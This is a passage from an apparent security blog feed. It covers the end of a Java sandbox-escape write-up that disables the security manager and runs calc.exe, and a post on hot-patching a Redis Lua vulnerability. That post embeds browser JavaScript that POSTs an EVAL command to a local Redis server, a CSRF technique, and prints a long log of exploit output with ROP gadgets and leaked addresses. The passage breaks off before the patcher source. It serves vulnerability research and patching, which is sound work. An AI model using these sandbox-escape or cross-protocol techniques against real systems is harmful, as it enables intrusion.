<p>Next we deserialize this object in the sandboxed class. We then run a gc cycle and sleep. This massively improves the chance of the exploit succeeding. I suspect this is because the array that I allocate to catch the write is more likely to appear after the ConcurrentHashMap in memory and also more likely to be closer to the ConcurrentHashMap in memory. If the segs array is > (262144 * bytes) bytes away in memory from the segments array in the concurrent hash map object then the exploit will fail and probably crash when it tries to read an object and it is not properly aligned. The exploit will also fail if the segs array is located before the ConcurrentHashMap&#8217;s segment array in memory.</p>

<p>Next we allocate a big array of Segs to try to catch the write that ConcurrentHashMap does. The Seg class has the exact same structure as ConcurrentHashMap.Segment does. It also contains a HEntry class which has the exact same structure as ConcurrentHashMap.HashEntry. One major difference is HEntry value field is typed EvilClassLoader while ConcurrentHashMap.HashEntry value field is typed Object.</p>

<p>Next we call on the put method on ConcurrentHashMap. This will hopefully either write to the 0th segment in ConcurrentHashMap or write into our array of Segs.</p>

<p>As the value to the put call we use a ClassLoader object. The hope is that will end up with a HEntry object that has a value filled in with a ClassLoader object but which is typed EvilClassLoader. Our EvilClassLoader object has a static method which can be used to define classes with arbitrary protection domains. Normally the JVM will not let you create an EvilClassLoader object because it can subvert the sandbox. There is a check in the ClassLoader&#8217;s constructor to prevent you from doing this. But if the JVM gets confused about types because of a naughty UNSAFE.putObjectVolatile then we can trick the JVM into believing a ClassLoader is really an EvilClassLoader and we can call our evil methods on the ClassLoader instance.</p>

<p>If we can get an object typed EvilClassLoader then it is game over because we can load the Evil class which has a method &#8216;disable&#8217; which disables the security manager. The disable method will succeed because it does AccessController.doPrivileged and it has the AllPermission we added using the EvilClassLoader&#8217;s defineClass method.</p>

<p>We repeat the calls to the put method with different String values because the jvm hashing algorithm is randomized and we can get unlucky and repeatedly get offset values of 0. I believe at the time Java was using Murmur/Murmur2 + mixed in secret key in order to protect against HashDoS and it was easier to just keep generating different strings than to try and reverse the secret key.</p>

<h2>Testing</h2>

<pre><code>java -Djava.security.manager CHM
</code></pre>

<p>or</p>

<pre><code>appletviewer test.html
</code></pre>

<p>It will print out &#8220;user.home&#8221; system property and try to run calc.exe</p>

<p>I&#8217;ve tested this with latest jdk 1.7.0_09 on windows 7 and mac osx. If you have trouble getting it working segmentMask in Make.java (need to copy bytes to INPUT field in CHM.java after making change) and the size of segs array in CHM.java can be tweaked.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Redis Hot Patch]]></title>
    <link href="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/"/>
    <updated>2015-06-09T09:53:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch</id>
    <content type="html"><![CDATA[<div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.</p>&mdash; Salvatore Sanfilippo (@antirez) <a href="https://twitter.com/antirez/status/606440338102689792">June 4, 2015</a></blockquote>
<script async src="http://benmmurphy.github.com//platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>The arbitrary read and arbitrary write from the <a href="https://gist.github.com/corsix/6575486">Lua vulnerability</a> makes it quite easy to patch the vulnerability itself. I have written a proof of concept that should work on OSX Yosemite with any of the Homebrew bottled Redis versions that are vulnerable. It should also work on Mavericks and other compiled versions of Redis but I have not tested it on them (on versions other than Yosemite it may crash if the format of the long jump buffer is not the same). The Hot Patcher looks for the instruction <a href="https://github.com/antirez/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411#diff-9486950b94262375ea8951aecc31b93cL498">cmp r15, 0x1b</a> and replaces it with &#8216;cmpq rsp,0x1b&#8217;. This comparison should never be true because the stack typically lives around 0x7fxxxxxxxxxxxxxx and will never reach such a low address. However, looking for this exact instruction makes the patcher quite brittle and it may not work on Redis versions compiled with different compilers.</p>

<p>The Hot Patcher proof of concept uses the CSRF technique to run so you can run it directly from your browser. However, before running it you should understand:</p>

<ul>
<li>it may crash your Redis server and you may lose your data (i think the exploit used to crash when the shellcode was allocated across two pages and i was only mprotect&#8217;ing the bottom page. but if this wasn&#8217;t the cause of the crash then the exploit is still flakey. or there could still be bugs.)</li>
<li>it might not crash your Redis server but may silently corrupt the data in your Redis server</li>
<li>you MUST own the Redis server running on 127.0.0.1:6379</li>
<li>this is not a full fix for the Lua sandbox bypass and only disables the loading of bytecode</li>
<li>it does not permanently patch Redis and the patch will be reverted after a restart</li>
<li>it is probably better to write a script for GDB to do the live patching. But I don&#8217;t understand GDB scripting :(</li>
</ul>


<p><input id='hot_patch' type='button' value='Hot Patch Me' style="background-color: red; border-color: black; color: white; border-radius: 0px; border-style: solid; border-width: 2px; font-size: 30px; cursor: pointer" /></p>

<script type='text/javascript'>

(function() {
  function doit() {

    var captions = $("figcaption span");

    for (var i = 0; i < captions.length; ++i) {
      if ($(captions[i]).text() == "Patch Source Code") {

        var text = $(".code", captions[i].parentNode.parentNode).text();

        var bad = "EVAL "  + JSON.stringify(text) + " 0\r\n";
        var x = new XMLHttpRequest();
        x.open("POST", "http://localhost:6379");
        x.send(bad);
      }
    }
  }

  $("#hot_patch").click(function() {

    if (confirm("You agree that you have reviewed the source code of this page and understand what the patcher will do and will not hold the author of this page liable for any damage the patcher may cause. ")) {

      doit();
    }
  });
})();

</script>


<p>It is best to run the Redis server from your terminal then you can see the output from the patcher. It should look something like:</p>

<figure class='code'><figcaption><span>Example Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Matches OSX =&gt; Darwin 14.3.0 x86_64
</span><span class='line'>[*] 64 Bit
</span><span class='line'>[*] Loading byte code supported
</span><span class='line'>[*] found macho base address: 000000010c9c2000
</span><span class='line'>[*] found segment: __PAGEZERO =&gt; 0000000000000000/0000000000000000
</span><span class='line'>[*] found segment: __TEXT =&gt; 0000000100000000/0000000000000000
</span><span class='line'>[*] found segment: __DATA =&gt; 0000000100066000/0000000000066000
</span><span class='line'>[*] found segment: __LINKEDIT =&gt; 0000000100080000/000000000006b000
</span><span class='line'>[*] parsed_symbol ___assert_rtn =&gt; 2:224
</span><span class='line'>[*] parsed_symbol ___bzero =&gt; 2:232
</span><span class='line'>[*] parsed_symbol ___error =&gt; 2:240
</span><span class='line'>[*] parsed_symbol ___maskrune =&gt; 2:248
</span><span class='line'>[*] parsed_symbol ___memcpy_chk =&gt; 2:256
</span><span class='line'>[*] parsed_symbol ___snprintf_chk =&gt; 2:264
</span><span class='line'>[*] parsed_symbol ___sprintf_chk =&gt; 2:272
</span><span class='line'>[*] parsed_symbol ___stack_chk_fail =&gt; 2:280
</span><span class='line'>[*] parsed_symbol ___strcat_chk =&gt; 2:288
</span><span class='line'>[*] parsed_symbol ___strncat_chk =&gt; 2:296
</span><span class='line'>[*] parsed_symbol ___strncpy_chk =&gt; 2:304
</span><span class='line'>[*] parsed_symbol ___tolower =&gt; 2:312
</span><span class='line'>[*] parsed_symbol ___toupper =&gt; 2:320
</span><span class='line'>[*] parsed_symbol ___vsnprintf_chk =&gt; 2:328
</span><span class='line'>[*] parsed_symbol __exit =&gt; 2:336
</span><span class='line'>[*] parsed_symbol _abort =&gt; 2:344
</span><span class='line'>[*] parsed_symbol _accept =&gt; 2:352
</span><span class='line'>[*] parsed_symbol _access =&gt; 2:360
</span><span class='line'>[*] parsed_symbol _acos =&gt; 2:368
</span><span class='line'>[*] parsed_symbol _asin =&gt; 2:376
</span><span class='line'>[*] parsed_symbol _atan =&gt; 2:384
</span><span class='line'>[*] parsed_symbol _atan2 =&gt; 2:392
</span><span class='line'>[*] parsed_symbol _atoi =&gt; 2:400
</span><span class='line'>[*] parsed_symbol _backtrace =&gt; 2:408
</span><span class='line'>[*] parsed_symbol _backtrace_symbols_fd =&gt; 2:416
</span><span class='line'>[*] parsed_symbol _bind =&gt; 2:424
</span><span class='line'>[*] parsed_symbol _calloc =&gt; 2:432
</span><span class='line'>[*] parsed_symbol _ceil =&gt; 2:440
</span><span class='line'>[*] parsed_symbol _chdir =&gt; 2:448
</span><span class='line'>[*] parsed_symbol _chmod =&gt; 2:456
</span><span class='line'>[*] parsed_symbol _close =&gt; 2:464
</span><span class='line'>[*] parsed_symbol _connect =&gt; 2:472
</span><span class='line'>[*] parsed_symbol _cos =&gt; 2:480
</span><span class='line'>[*] parsed_symbol _cosh =&gt; 2:488
</span><span class='line'>[*] parsed_symbol _dup2 =&gt; 2:496
</span><span class='line'>[*] parsed_symbol _execve =&gt; 2:504
</span><span class='line'>[*] parsed_symbol _exit =&gt; 2:512
</span><span class='line'>[*] parsed_symbol _exp =&gt; 2:520
</span><span class='line'>[*] parsed_symbol _fclose =&gt; 2:528
</span><span class='line'>[*] parsed_symbol _fcntl =&gt; 2:536
</span><span class='line'>[*] parsed_symbol _feof =&gt; 2:544
</span><span class='line'>[*] parsed_symbol _ferror =&gt; 2:552
</span><span class='line'>[*] parsed_symbol _fflush =&gt; 2:560
</span><span class='line'>[*] parsed_symbol _fgets =&gt; 2:568
</span><span class='line'>[*] parsed_symbol _fileno =&gt; 2:576
</span><span class='line'>[*] parsed_symbol _floor =&gt; 2:584
</span><span class='line'>[*] parsed_symbol _fmod =&gt; 2:592
</span><span class='line'>[*] parsed_symbol _fopen =&gt; 2:600
</span><span class='line'>[*] parsed_symbol _fork =&gt; 2:608
</span><span class='line'>[*] parsed_symbol _fprintf =&gt; 2:616
</span><span class='line'>[*] parsed_symbol _fputc =&gt; 2:624
</span><span class='line'>[*] parsed_symbol _fputs =&gt; 2:632
</span><span class='line'>[*] parsed_symbol _fread =&gt; 2:640
</span><span class='line'>[*] parsed_symbol _free =&gt; 2:648
</span><span class='line'>[*] parsed_symbol _freeaddrinfo =&gt; 2:656
</span><span class='line'>[*] parsed_symbol _freopen =&gt; 2:664
</span><span class='line'>[*] parsed_symbol _frexp =&gt; 2:672
</span><span class='line'>[*] parsed_symbol _fstat$INODE64 =&gt; 2:680
</span><span class='line'>[*] parsed_symbol _fsync =&gt; 2:688
</span><span class='line'>[*] parsed_symbol _ftello =&gt; 2:696
</span><span class='line'>[*] parsed_symbol _ftruncate =&gt; 2:704
</span><span class='line'>[*] parsed_symbol _fwrite =&gt; 2:712
</span><span class='line'>[*] parsed_symbol _gai_strerror =&gt; 2:720
</span><span class='line'>[*] parsed_symbol _getaddrinfo =&gt; 2:728
</span><span class='line'>[*] parsed_symbol _getc =&gt; 2:736
</span><span class='line'>[*] parsed_symbol _getcwd =&gt; 2:744
</span><span class='line'>[*] parsed_symbol _getpeername =&gt; 2:752
</span><span class='line'>[*] parsed_symbol _getpid =&gt; 2:760
</span><span class='line'>[*] parsed_symbol _getprogname =&gt; 2:768
</span><span class='line'>[*] parsed_symbol _getrlimit =&gt; 2:776
</span><span class='line'>[*] parsed_symbol _getrusage =&gt; 2:784
</span><span class='line'>[*] parsed_symbol _getsockname =&gt; 2:792
</span><span class='line'>[*] parsed_symbol _getsockopt =&gt; 2:800
</span><span class='line'>[*] parsed_symbol _gettimeofday =&gt; 2:808
</span><span class='line'>[*] parsed_symbol _inet_ntop =&gt; 2:816
</span><span class='line'>[*] parsed_symbol _ioctl =&gt; 2:824
</span><span class='line'>[*] parsed_symbol _kevent =&gt; 2:832
</span><span class='line'>[*] parsed_symbol _kill =&gt; 2:840
</span><span class='line'>[*] parsed_symbol _kqueue =&gt; 2:848
</span><span class='line'>[*] parsed_symbol _ldexp =&gt; 2:856
</span><span class='line'>[*] parsed_symbol _listen =&gt; 2:864
</span><span class='line'>[*] parsed_symbol _localeconv =&gt; 2:872
</span><span class='line'>[*] parsed_symbol _localtime =&gt; 2:880
</span><span class='line'>[*] parsed_symbol _log =&gt; 2:888
</span><span class='line'>[*] parsed_symbol _log10 =&gt; 2:896
</span><span class='line'>[*] parsed_symbol _longjmp =&gt; 2:904
</span><span class='line'>[*] parsed_symbol _lseek =&gt; 2:912
</span><span class='line'>[*] parsed_symbol _malloc =&gt; 2:920
</span><span class='line'>[*] parsed_symbol _malloc_size =&gt; 2:928
</span><span class='line'>[*] parsed_symbol _memchr =&gt; 2:936
</span><span class='line'>[*] parsed_symbol _memcmp =&gt; 2:944
</span><span class='line'>[*] parsed_symbol _memcpy =&gt; 2:952
</span><span class='line'>[*] parsed_symbol _memmove =&gt; 2:960
</span><span class='line'>[*] parsed_symbol _memset =&gt; 2:968
</span><span class='line'>[*] parsed_symbol _memset_pattern16 =&gt; 2:976
</span><span class='line'>[*] parsed_symbol _modf =&gt; 2:984
</span><span class='line'>[*] parsed_symbol _nanosleep =&gt; 2:992
</span><span class='line'>[*] parsed_symbol _open =&gt; 2:1000
</span><span class='line'>[*] parsed_symbol _openlog =&gt; 2:1008
</span><span class='line'>[*] parsed_symbol _perror =&gt; 2:1016
</span><span class='line'>[*] parsed_symbol _poll =&gt; 2:1024
</span><span class='line'>[*] parsed_symbol _pow =&gt; 2:1032
</span><span class='line'>[*] parsed_symbol _printf =&gt; 2:1040
</span><span class='line'>[*] parsed_symbol _pthread_attr_getstacksize =&gt; 2:1048
</span><span class='line'>[*] parsed_symbol _pthread_attr_init =&gt; 2:1056
</span><span class='line'>[*] parsed_symbol _pthread_attr_setstacksize =&gt; 2:1064
</span><span class='line'>[*] parsed_symbol _pthread_cancel =&gt; 2:1072
</span><span class='line'>[*] parsed_symbol _pthread_cond_init =&gt; 2:1080
</span><span class='line'>[*] parsed_symbol _pthread_cond_signal =&gt; 2:1088
</span><span class='line'>[*] parsed_symbol _pthread_cond_wait =&gt; 2:1096
</span><span class='line'>[*] parsed_symbol _pthread_create =&gt; 2:1104
</span><span class='line'>[*] parsed_symbol _pthread_join =&gt; 2:1112
</span><span class='line'>[*] parsed_symbol _pthread_mutex_init =&gt; 2:1120
</span><span class='line'>[*] parsed_symbol _pthread_mutex_lock =&gt; 2:1128
</span><span class='line'>[*] parsed_symbol _pthread_mutex_unlock =&gt; 2:1136
</span><span class='line'>[*] parsed_symbol _pthread_setcancelstate =&gt; 2:1144
</span><span class='line'>[*] parsed_symbol _pthread_setcanceltype =&gt; 2:1152
</span><span class='line'>[*] parsed_symbol _pthread_sigmask =&gt; 2:1160
</span><span class='line'>[*] parsed_symbol _putchar =&gt; 2:1168
</span><span class='line'>[*] parsed_symbol _puts =&gt; 2:1176
</span><span class='line'>[*] parsed_symbol _qsort =&gt; 2:1184
</span><span class='line'>[*] parsed_symbol _rand =&gt; 2:1192
</span><span class='line'>[*] parsed_symbol _random =&gt; 2:1200
</span><span class='line'>[*] parsed_symbol _read =&gt; 2:1208
</span><span class='line'>[*] parsed_symbol _realloc =&gt; 2:1216
</span><span class='line'>[*] parsed_symbol _rename =&gt; 2:1224
</span><span class='line'>[*] parsed_symbol _setenv =&gt; 2:1232
</span><span class='line'>[*] parsed_symbol _setitimer =&gt; 2:1240
</span><span class='line'>[*] parsed_symbol _setjmp =&gt; 2:1248
</span><span class='line'>[*] parsed_symbol _setlocale =&gt; 2:1256
</span><span class='line'>[*] parsed_symbol _setprogname =&gt; 2:1264
</span><span class='line'>[*] parsed_symbol _setrlimit =&gt; 2:1272
</span><span class='line'>[*] parsed_symbol _setsid =&gt; 2:1280
</span><span class='line'>[*] parsed_symbol _setsockopt =&gt; 2:1288
</span><span class='line'>[*] parsed_symbol _sigaction =&gt; 2:1296
</span><span class='line'>[*] parsed_symbol _signal =&gt; 2:1304
</span><span class='line'>[*] parsed_symbol _sin =&gt; 2:1312
</span><span class='line'>[*] parsed_symbol _sinh =&gt; 2:1320
</span><span class='line'>[*] parsed_symbol _sleep =&gt; 2:1328
</span><span class='line'>[*] parsed_symbol _socket =&gt; 2:1336
</span><span class='line'>[*] parsed_symbol _srand =&gt; 2:1344
</span><span class='line'>[*] parsed_symbol _sscanf =&gt; 2:1352
</span><span class='line'>[*] parsed_symbol _strcasecmp =&gt; 2:1360
</span><span class='line'>[*] parsed_symbol _strchr =&gt; 2:1368
</span><span class='line'>[*] parsed_symbol _strcmp =&gt; 2:1376
</span><span class='line'>[*] parsed_symbol _strcoll =&gt; 2:1384
</span><span class='line'>[*] parsed_symbol _strcspn =&gt; 2:1392
</span><span class='line'>[*] parsed_symbol _strdup =&gt; 2:1400
</span><span class='line'>[*] parsed_symbol _strerror =&gt; 2:1408
</span><span class='line'>[*] parsed_symbol _strerror_r =&gt; 2:1416
</span><span class='line'>[*] parsed_symbol _strftime =&gt; 2:1424
</span><span class='line'>[*] parsed_symbol _strlen =&gt; 2:1432
</span><span class='line'>[*] parsed_symbol _strncasecmp =&gt; 2:1440
</span><span class='line'>[*] parsed_symbol _strncmp =&gt; 2:1448
</span><span class='line'>[*] parsed_symbol _strncpy =&gt; 2:1456
</span><span class='line'>[*] parsed_symbol _strpbrk =&gt; 2:1464
</span><span class='line'>[*] parsed_symbol _strstr =&gt; 2:1472
</span><span class='line'>[*] parsed_symbol _strtod =&gt; 2:1480
</span><span class='line'>[*] parsed_symbol _strtol =&gt; 2:1488
</span><span class='line'>[*] parsed_symbol _strtold =&gt; 2:1496
</span><span class='line'>[*] parsed_symbol _strtoll =&gt; 2:1504
</span><span class='line'>[*] parsed_symbol _strtoul =&gt; 2:1512
</span><span class='line'>[*] parsed_symbol _strtoull =&gt; 2:1520
</span><span class='line'>[*] parsed_symbol _syslog =&gt; 2:1528
</span><span class='line'>[*] parsed_symbol _tan =&gt; 2:1536
</span><span class='line'>[*] parsed_symbol _tanh =&gt; 2:1544
</span><span class='line'>[*] parsed_symbol _task_for_pid =&gt; 2:1552
</span><span class='line'>[*] parsed_symbol _task_info =&gt; 2:1560
</span><span class='line'>[*] parsed_symbol _time =&gt; 2:1568
</span><span class='line'>[*] parsed_symbol _uname =&gt; 2:1576
</span><span class='line'>[*] parsed_symbol _ungetc =&gt; 2:1584
</span><span class='line'>[*] parsed_symbol _unlink =&gt; 2:1592
</span><span class='line'>[*] parsed_symbol _vfprintf =&gt; 2:1600
</span><span class='line'>[*] parsed_symbol _wait3 =&gt; 2:1608
</span><span class='line'>[*] parsed_symbol _write =&gt; 2:1616
</span><span class='line'>[*] Found _strlen symbol: 1432
</span><span class='line'>[*] Found _strlen location: 00007fff97463140
</span><span class='line'>[*] found libsystem_c macho base address: 00007fff97462000
</span><span class='line'>[*] Found _setrlimit symbol: 1272
</span><span class='line'>[*] Found _setrlimit location: 00007fff945edc4a
</span><span class='line'>[*] found libkernel macho base address: 00007fff945da000
</span><span class='line'>[+] Found longjump jump location 000000010ca1a05a
</span><span class='line'>[*] found segment: __TEXT =&gt; 00007fff8ca8c000/0000000000000000
</span><span class='line'>[*] found segment: __DATA =&gt; 00007fff71e58000/0000000011996000
</span><span class='line'>[*] found segment: __LINKEDIT =&gt; 00007fff8fed3000/00000000124cf000
</span><span class='line'>[+] found mprotect symbol 00007fff945efee8
</span><span class='line'>[*] found segment: __TEXT =&gt; 00007fff8f914000/0000000000000000
</span><span class='line'>[*] found segment: __DATA =&gt; 00007fff7258e000/00000000120cc000
</span><span class='line'>[*] found segment: __LINKEDIT =&gt; 00007fff8fed3000/00000000124cf000
</span><span class='line'>[*] found cmp   r15, 0x1b
</span><span class='line'>[*] found cmp @ 000000010ca05fb5
</span><span class='line'>[*] Found rop: poprbxpopr14poprbp @ 00007fff97463449
</span><span class='line'>[*] Found rop: poprdipoprbp @ 00007fff974635ee
</span><span class='line'>[*] Found rop: poprsipoprbp @ 00007fff9746344b
</span><span class='line'>[*] Found rop: movrdxr14callrbx @ 00007fff974c62f4
</span><span class='line'>[*] leaked stack pointer: 00007fff5323d018
</span><span class='line'>[*] old jump_buf eip 000000010ca052c0
</span><span class='line'>[*] existing sp 00007fff5323d010
</span><span class='line'>[*] new sp 00007fc98a80a218
</span><span class='line'>[*] resumed normal redis execution</span></code></pre></td></tr></table></div></figure>


<p>You can test if the patcher worked by running the following from redis-cli:</p>

<figure class='code'><figcaption><span>Example Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eval "return tostring(loadstring(string.dump(function() end)))" 0</span></code></pre></td></tr></table></div></figure>


<p>If you are vulnerable it will return:</p>

<figure class='code'><figcaption><span>Example Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"function: 0x7fdcd8439df0"</span></code></pre></td></tr></table></div></figure>


<p>If the patch has been applied it will return:</p>

<figure class='code'><figcaption><span>Example Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"nil"</span></code></pre></td></tr></table></div></figure>


<p>Here is the lua code for the patcher:</p>

<figure class='code'><figcaption><span>Patch Source Code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
